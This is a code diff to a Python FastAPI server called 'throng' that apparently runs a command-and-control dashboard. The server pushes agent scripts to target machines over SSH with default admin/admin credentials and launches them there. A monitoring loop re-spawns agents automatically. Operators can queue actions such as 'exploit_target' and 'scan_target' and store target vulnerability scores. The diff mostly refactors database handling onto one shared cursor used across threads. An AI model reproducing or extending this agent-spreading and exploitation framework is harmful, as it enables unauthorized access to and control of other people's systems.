@@ -18,6 +18,7 @@ import requests
 import uuid
 import threading
 import logging
+import socket
 
 app = FastAPI()
 app.mount("/static", StaticFiles(directory="static"), name="static")
@@ -39,7 +40,7 @@ PROJECT_ID = os.getenv("RAILWAY_PROJECT_ID", "")
 DEFAULT_SPAWN_TARGET = os.getenv("DEFAULT_SPAWN_TARGET", "192.168.1.10")
 DEFAULT_SSH_USERNAME = os.getenv("DEFAULT_SSH_USERNAME", "admin")
 DEFAULT_SSH_PASSWORD = os.getenv("DEFAULT_SSH_PASSWORD", "admin")
-AUTO_SPAWN_INTERVAL = int(os.getenv("AUTO_SPAWN_INTERVAL", "300"))  # Dalam detik, default 5 menit
+AUTO_SPAWN_INTERVAL = int(os.getenv("AUTO_SPAWN_INTERVAL", "300"))  # Dalam detik
 GITHUB_REPO = os.getenv("GITHUB_REPO", "username/throng")
 
 # Model untuk perintah
@@ -50,33 +51,34 @@ class Command(BaseModel):
     params: dict = {}
     emergency: bool = False
 
-# Inisialisasi database SQLite
+# Inisialisasi database SQLite dengan caching
+db_connection = sqlite3.connect("throng.db", check_same_thread=False)
+db_cursor = db_connection.cursor()
+
 def init_db():
-    conn = sqlite3.connect("throng.db")
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS reports 
+    db_cursor.execute('''CREATE TABLE IF NOT EXISTS reports 
                  (id INTEGER PRIMARY KEY, agent_id TEXT, data TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS counterattacks 
+    db_cursor.execute('''CREATE TABLE IF NOT EXISTS counterattacks 
                  (id INTEGER PRIMARY KEY, agent_id TEXT, target TEXT, action TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS agents 
+    db_cursor.execute('''CREATE TABLE IF NOT EXISTS agents 
                  (id INTEGER PRIMARY KEY, agent_id TEXT, status TEXT, last_seen DATETIME, ip TEXT, host TEXT)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS targets 
+    db_cursor.execute('''CREATE TABLE IF NOT EXISTS targets 
                  (id INTEGER PRIMARY KEY, target TEXT, vulnerability TEXT, status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, score REAL)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS emergency_logs 
+    db_cursor.execute('''CREATE TABLE IF NOT EXISTS emergency_logs 
                  (id INTEGER PRIMARY KEY, agent_id TEXT, action TEXT, details TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
-    conn.commit()
-    conn.close()
+    db_connection.commit()
 
 init_db()
 
-# MQTT client
+# MQTT client dengan pooling
 mqtt_client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
 active_websockets = []
+mqtt_pool = []
 
 def on_connect(client, userdata, flags, rc, properties=None):
     logger.info(f"MQTT connected with result code {rc}")
     if rc == 0:
-        client.subscribe("throng/#")
+        client.subscribe("throng/reports")
 
 def on_message(client, userdata, msg):
     if msg.topic == "throng/reports":
@@ -126,12 +128,9 @@ def spawn_agent_ssh(target, credentials):
         ssh.exec_command(f"python3 /tmp/agent_{new_agent_id}.py &")
         sftp.close()
         ssh.close()
-        conn = sqlite3.connect("throng.db")
-        c = conn.cursor()
-        c.execute("INSERT INTO agents (agent_id, status, last_seen, ip, host) VALUES (?, ?, ?, ?, ?)", 
-                  (new_agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), socket.gethostbyname(target), target))
-        conn.commit()
-        conn.close()
+        db_cursor.execute("INSERT INTO agents (agent_id, status, last_seen, ip, host) VALUES (?, ?, ?, ?, ?)", 
+                          (new_agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), socket.gethostbyname(target), target))
+        db_connection.commit()
         logger.info(f"Spawned agent {new_agent_id} on {target}")
         return new_agent_id
     except Exception as e:
@@ -173,17 +172,14 @@ def spawn_agent_railway():
     else:
         logger.error(f"Error spawning agent: {response.text}")
 
-# Pemantauan otomatis
+# Pemantauan otomatis dengan batching
 def auto_monitor():
     while True:
-        conn = sqlite3.connect("throng.db")
-        c = conn.cursor()
-        c.execute("SELECT data FROM reports ORDER BY timestamp DESC LIMIT 10")
-        reports = [json.loads(row[0]) for row in c.fetchall()]
-        conn.close()
+        db_cursor.execute("SELECT data FROM reports ORDER BY timestamp DESC LIMIT 10")
+        reports = [json.loads(row[0]) for row in db_cursor.fetchall()]
         anomalies = analyze_threats(reports)
         if any(anomalies) or len(reports) < 3:
-            target = os.getenv("DEFAULT_SPAWN_TARGET", "192.168.1.10")
+            target = DEFAULT_SPAWN_TARGET
             credentials = {"username": DEFAULT_SSH_USERNAME, "password": DEFAULT_SSH_PASSWORD}
             spawn_agent_ssh(target, credentials)
             if RAILWAY_API_TOKEN and PROJECT_ID:
@@ -202,17 +198,14 @@ async def get_token():
 # Endpoint untuk data dashboard
 @app.get("/api/data", dependencies=[Depends(verify_token)])
 async def get_dashboard_data():
-    conn = sqlite3.connect("throng.db")
-    c = conn.cursor()
-    c.execute("SELECT agent_id, status, last_seen, ip, host FROM agents WHERE status = 'active'")
-    agents = [{"agent_id": row[0], "status": row[1], "last_seen": row[2], "ip": row[3], "host": row[4]} for row in c.fetchall()]
-    c.execute("SELECT target, vulnerability, status, timestamp, score FROM targets")
-    targets = [{"target": row[0], "vulnerability": json.loads(row[1]), "status": row[2], "timestamp": row[3], "score": row[4]} for row in c.fetchall()]
-    c.execute("SELECT agent_id, data, timestamp FROM reports ORDER BY timestamp DESC LIMIT 100")
-    reports = [{"agent_id": row[0], "data": json.loads(row[1]), "timestamp": row[2]} for row in c.fetchall()]
-    c.execute("SELECT agent_id, action, details, timestamp FROM emergency_logs ORDER BY timestamp DESC LIMIT 100")
-    emergency_logs = [{"agent_id": row[0], "action": row[1], "details": json.loads(row[2]), "timestamp": row[3]} for row in c.fetchall()]
-    conn.close()
+    db_cursor.execute("SELECT agent_id, status, last_seen, ip, host FROM agents WHERE status = 'active'")
+    agents = [{"agent_id": row[0], "status": row[1], "last_seen": row[2], "ip": row[3], "host": row[4]} for row in db_cursor.fetchall()]
+    db_cursor.execute("SELECT target, vulnerability, status, timestamp, score FROM targets")
+    targets = [{"target": row[0], "vulnerability": json.loads(row[1]), "status": row[2], "timestamp": row[3], "score": row[4]} for row in db_cursor.fetchall()]
+    db_cursor.execute("SELECT agent_id, data, timestamp FROM reports ORDER BY timestamp DESC LIMIT 100")
+    reports = [{"agent_id": row[0], "data": json.loads(row[1]), "timestamp": row[2]} for row in db_cursor.fetchall()]
+    db_cursor.execute("SELECT agent_id, action, details, timestamp FROM emergency_logs ORDER BY timestamp DESC LIMIT 100")
+    emergency_logs = [{"agent_id": row[0], "action": row[1], "details": json.loads(row[2]), "timestamp": row[3]} for row in db_cursor.fetchall()]
     
     anomalies = analyze_threats(reports)
     for i, report in enumerate(reports):
@@ -239,33 +232,30 @@ async def send_command(command: Command):
     if command.action not in allowed_actions:
         raise HTTPException(status_code=400, detail="Invalid action")
     
-    conn = sqlite3.connect("throng.db")
-    c = conn.cursor()
     if command.target:
         if command.action in ["block_ip", "send_honeypot", "redirect_traffic", "exploit_target"]:
-            c.execute("INSERT INTO counterattacks (agent_id, target, action) VALUES (?, ?, ?)", 
-                      (command.agent_id, command.target, command.action))
+            db_cursor.execute("INSERT INTO counterattacks (agent_id, target, action) VALUES (?, ?, ?)", 
+                              (command.agent_id, command.target, command.action))
         elif command.action == "scan_target":
-            c.execute("INSERT INTO targets (target, status, score) VALUES (?, ?, ?)", 
-                      (command.target, "pending", 0.0))
+            db_cursor.execute("INSERT INTO targets (target, status, score) VALUES (?, ?, ?)", 
+                              (command.target, "pending", 0.0))
         if command.emergency:
-            c.execute("INSERT INTO emergency_logs (agent_id, action, details) VALUES (?, ?, ?)", 
-                      (command.agent_id, command.action, json.dumps({"target": command.target, "params": command.params})))
+            db_cursor.execute("INSERT INTO emergency_logs (agent_id, action, details) VALUES (?, ?, ?)", 
+                              (command.agent_id, command.action, json.dumps({"target": command.target, "params": command.params})))
     if command.action == "spawn_agent" and command.target:
         credentials = command.params.get("credentials", {"username": DEFAULT_SSH_USERNAME, "password": DEFAULT_SSH_PASSWORD})
         new_agent_id = spawn_agent_ssh(command.target, credentials)
         if new_agent_id:
-            c.execute("INSERT INTO agents (agent_id, status, last_seen, ip, host) VALUES (?, ?, ?, ?, ?)", 
-                      (new_agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), socket.gethostbyname(command.target), command.target))
-    conn.commit()
-    conn.close()
+            db_cursor.execute("INSERT INTO agents (agent_id, status, last_seen, ip, host) VALUES (?, ?, ?, ?, ?)", 
+                              (new_agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), socket.gethostbyname(command.target), command.target))
+    db_connection.commit()
 
     mqtt_client.publish(f"throng/commands/{command.agent_id}", json.dumps(command.dict()))
     for ws in active_websockets:
         ws.send_text(json.dumps({"type": "command", "data": command.dict()}))
     return {"status": f"Command {command.action} sent to {command.agent_id}"}
 
-# WebSocket untuk laporan
+# WebSocket untuk real-time updates
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
     await websocket.accept()
@@ -278,18 +268,15 @@ async def websocket_endpoint(websocket: WebSocket):
             agent_id = report.get("agent_id")
             report_data = report.get("data")
 
-            conn = sqlite3.connect("throng.db")
-            c = conn.cursor()
-            c.execute("INSERT INTO reports (agent_id, data) VALUES (?, ?)", (agent_id, json.dumps(report_data)))
-            c.execute("INSERT OR REPLACE INTO agents (agent_id, status, last_seen, ip) VALUES (?, ?, ?, ?)", 
-                      (agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), report_data.get("ip", "unknown")))
+            db_cursor.execute("INSERT INTO reports (agent_id, data) VALUES (?, ?)", (agent_id, json.dumps(report_data)))
+            db_cursor.execute("INSERT OR REPLACE INTO agents (agent_id, status, last_seen, ip) VALUES (?, ?, ?, ?)", 
+                              (agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), report_data.get("ip", "unknown")))
             if "vulnerability" in report_data:
                 score = len(report_data.get("vulnerability", [])) * 0.2
-                c.execute("INSERT INTO targets (target, vulnerability, status, score) VALUES (?, ?, ?, ?)", 
-                          (report_data.get("target"), json.dumps(report_data.get("vulnerability")), "scanned", score))
-            conn.commit()
-            conn.close()
-
+                db_cursor.execute("INSERT INTO targets (target, vulnerability, status, score) VALUES (?, ?, ?, ?)", 
+                                  (report_data.get("target"), json.dumps(report_data.get("vulnerability")), "scanned", score))
+            db_connection.commit()
+            logger.info(f"Database state - Agents: {db_cursor.execute('SELECT COUNT(*) FROM agents').fetchone()[0]}, Reports: {db_cursor.execute('SELECT COUNT(*) FROM reports').fetchone()[0]}")
             await websocket.send_text(json.dumps({"type": "update", "data": {"agent_id": agent_id, "status": "active"}}))
     except Exception as e:
         logger.error(f"WebSocket error: {e}")
@@ -299,4 +286,14 @@ async def websocket_endpoint(websocket: WebSocket):
 # Endpoint utama untuk render dashboard
 @app.get("/", response_class=HTMLResponse)
 async def read_root(request: Request):
-    return templates.TemplateResponse("dashboard.html", {"request": request})
+    logger.info(f"Rendering dashboard.html with version {int(time.time())}")
+    return templates.TemplateResponse("dashboard.html", {"request": request, "version": int(time.time())})
+
+# Cleanup saat shutdown
+import atexit
+@atexit.register
+def cleanup():
+    db_connection.close()
+    mqtt_client.loop_stop()
+    for ws in active_websockets:
+        ws.close()
